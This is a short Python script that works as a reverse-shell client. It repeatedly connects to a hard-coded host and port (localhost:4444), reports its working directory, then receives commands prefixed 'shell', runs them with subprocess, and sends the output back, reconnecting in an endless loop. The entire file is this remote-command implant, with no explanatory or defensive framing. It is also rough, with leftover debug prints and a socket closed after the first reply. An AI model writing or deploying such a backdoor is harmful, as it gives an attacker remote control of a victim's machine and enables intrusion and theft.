import socket, os, sys, subprocess
from time import sleep

sHost = "localhost"
sPort = 4444
bufferSize = 1024 * 128
separator = " "
isntConnected = True
s = socket.socket()


def main():
    isntConnected = True
    s = socket.socket()
    while isntConnected:
        try:
            print("1")
            s.connect((sHost, sPort))

            print("2")
            isntConnected = False
            print("3")
        except:
            print("4")
            continue
            print("5")

        print(6)

    currentWorkingDirectory = os.getcwd()

    s.send(currentWorkingDirectory.encode())
    while True:
        try:
            cmd = s.recv(bufferSize).decode()

            if cmd.lower() == "exit":
                break
            if cmd[0:5] == "shell":
                cmd = cmd[6:len(cmd)]
                splited_command = cmd.split()
                if splited_command[0].lower() == "cd":

                    try:
                        os.chdir(''.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        output = str(e)
                    else:
                        output = ""
                else:
                    output = subprocess.getoutput(cmd)

                currentWorkingDirectory = os.getcwd()
                message = f'{output}{separator}{currentWorkingDirectory}'
                s.send(message.encode())
                s.close()
        except OSError:
            break


while True:
    main()


